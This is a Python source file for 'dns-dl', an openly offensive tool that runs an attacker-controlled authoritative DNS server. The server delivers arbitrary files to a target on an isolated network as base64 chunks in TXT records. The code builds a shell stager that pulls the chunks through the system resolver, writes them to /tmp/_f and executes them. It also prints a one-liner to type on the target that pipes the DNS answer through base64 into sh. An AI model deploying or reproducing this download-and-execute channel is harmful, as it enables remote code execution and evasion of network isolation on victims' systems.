#!/usr/bin/env python3
"""
dns-dl: serve a file over DNS TXT records — no external dependencies

Assumes the typical isolated-network model:
  target → internal resolver → (internet) → attacker's authoritative DNS
The target uses its system resolver; no direct connection to the attacker needed.
Prerequisite: NS record for <domain> must point to this server's public IP.

Usage:
  sudo python3 server.py <file> [--domain <d>] [--port <p>]

Hand-type on target (busybox/Alpine):
  nslookup -type=txt s.<domain>|cut -d\" -f2|base64 -d|sh

Flow:
  1. Target queries s.<domain>  → internal resolver forwards to attacker's NS
  2. Attacker returns base64-encoded loader script as TXT
  3. Loader queries 0.d.<domain>, 1.d.<domain>, ... → reassembles file chunks
  4. Decodes and executes
"""

import socket
import struct
import sys
import base64
import argparse

CHUNK = 180  # base64 chars per TXT record (well under 255-byte limit)


def parse_qname(buf, off):
    parts, seen = [], set()
    while off < len(buf):
        if off in seen:
            break
        seen.add(off)
        n = buf[off]
        if n == 0:
            off += 1
            break
        if n & 0xC0 == 0xC0:  # DNS pointer
            off += 2
            break
        off += 1
        parts.append(buf[off:off + n].decode('ascii', errors='replace'))
        off += n
    return '.'.join(parts).lower(), off


def txt_response(req, value):
    tid = req[:2]
    _, qend = parse_qname(req, 12)
    qend += 4  # skip QTYPE + QCLASS
    question = req[12:qend]

    # QR=1 AA=1 RD=1 RA=1
    hdr = tid + struct.pack('!H', 0x8580) + b'\x00\x01\x00\x01\x00\x00\x00\x00'

    raw = value.encode('ascii')
    rdata = b''
    for i in range(0, len(raw), 255):
        seg = raw[i:i + 255]
        rdata += struct.pack('B', len(seg)) + seg

    # name pointer (0xC00C) + TYPE=TXT(16) + CLASS=IN(1) + TTL=0 + rdlength
    ans = b'\xc0\x0c' + struct.pack('!HHIH', 16, 1, 0, len(rdata)) + rdata
    return hdr + question + ans


def nxdomain(req):
    _, qend = parse_qname(req, 12)
    qend += 4
    # QR=1 AA=1 RCODE=3
    return (req[:2]
            + struct.pack('!H', 0x8183)
            + b'\x00\x01\x00\x00\x00\x00\x00\x00'
            + req[12:qend])


def make_loader(domain):
    # Shell one-liner that fetches base64 file chunks via DNS and executes them.
    # Uses the system resolver (no server IP embedded) — queries propagate through
    # the internal resolver to the attacker's authoritative server via NS delegation.
    # Uses cut -d'"' -f2 (single-quoted ") so the script text has no raw double-quotes
    # — safe to base64-encode and embed in a TXT record.
    script = (
        "D=DOMAIN;"
        "i=0;r=;"
        "while c=$(nslookup -type=txt $i.d.$D 2>/dev/null"
        "|cut -d'\"' -f2);"   # Python '\"' → " in string → '"' in shell
        "[ $c ];"
        "do r=$r$c;i=$((i+1));done;"
        "printf %s $r|base64 -d>/tmp/_f;sh /tmp/_f"
    ).replace('DOMAIN', domain)
    # base64-encode so the TXT record itself has no " chars
    return base64.b64encode(script.encode()).decode()


def main():
    ap = argparse.ArgumentParser(description='dns-dl: deliver files via DNS TXT records')
    ap.add_argument('file', help='file to serve')
    ap.add_argument('--domain', '-d', default='x.lo',
                    help='domain label to answer (default: x.lo)')
    ap.add_argument('--port', '-p', type=int, default=53)
    args = ap.parse_args()

    raw = open(args.file, 'rb').read()
    b64 = base64.b64encode(raw).decode()
    chunks = [b64[i:i + CHUNK] for i in range(0, len(b64), CHUNK)]
    loader_b64 = make_loader(args.domain)

    print(f'[*] file    : {args.file} ({len(raw)} bytes)')
    print(f'[*] chunks  : {len(chunks)} × {CHUNK} chars of base64')
    print(f'[*] loader  : {len(base64.b64decode(loader_b64))} chars script → {len(loader_b64)} chars b64 (served at s.{args.domain})')
    print()
    print('[!] Hand-type on target:')
    print()
    print(f'    nslookup -type=txt s.{args.domain}|cut -d\\" -f2|base64 -d|sh')
    print()

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        sock.bind(('0.0.0.0', args.port))
    except PermissionError:
        sys.exit(f'[!] Need root to bind port {args.port}. Run with sudo.')

    domain = args.domain.lower()
    print(f'[*] Listening on 0.0.0.0:{args.port}/udp')

    while True:
        try:
            pkt, addr = sock.recvfrom(512)
            if len(pkt) < 12:
                continue

            name, _ = parse_qname(pkt, 12)

            if not name.endswith(domain):
                sock.sendto(nxdomain(pkt), addr)
                continue

            # strip trailing ".domain" to get the subdomain label(s)
            sub = name[:-(len(domain) + 1)]

            if sub == 's':
                print(f'  [stager]         ← {addr[0]}')
                sock.sendto(txt_response(pkt, loader_b64), addr)

            elif sub.endswith('.d'):
                try:
                    idx = int(sub[:-2])  # "42.d" → 42
                except ValueError:
                    sock.sendto(nxdomain(pkt), addr)
                    continue
                if 0 <= idx < len(chunks):
                    print(f'  [chunk {idx:4d}/{len(chunks) - 1}] ← {addr[0]}')
                    sock.sendto(txt_response(pkt, chunks[idx]), addr)
                else:
                    sock.sendto(nxdomain(pkt), addr)

            else:
                sock.sendto(nxdomain(pkt), addr)

        except KeyboardInterrupt:
            print('\n[*] Stopped.')
            break
        except Exception as e:
            print(f'[!] {e}')


if __name__ == '__main__':
    main()
